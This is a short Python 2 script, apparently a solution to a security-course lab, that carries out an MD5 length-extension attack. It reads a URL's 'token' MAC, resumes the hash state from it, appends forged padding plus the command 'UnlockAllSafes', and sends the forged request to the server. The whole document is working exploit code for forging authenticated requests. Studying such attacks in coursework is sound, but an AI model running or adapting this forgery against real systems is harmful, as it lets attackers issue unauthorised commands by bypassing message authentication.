import httplib, urlparse, sys, urllib
from pymd5 import md5, padding
url = sys.argv[1]

# Your code to modify url goes here
c3 = "&command3=UnlockAllSafes"

parsedUrl = urlparse.urlparse(url)
query = parsedUrl.query
params =  urlparse.parse_qs(query)
token = params["token"][0]
old = query[(len("token=")+len(token)+1):]

h = md5(state=token.decode("hex"), count=512)
pad = padding((len(old)+8)*8)
qpad = urllib.quote(pad)
h.update(c3)
query = "token=" + h.hexdigest() + '&' + old + qpad + c3

conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + query)
print conn.getresponse().read()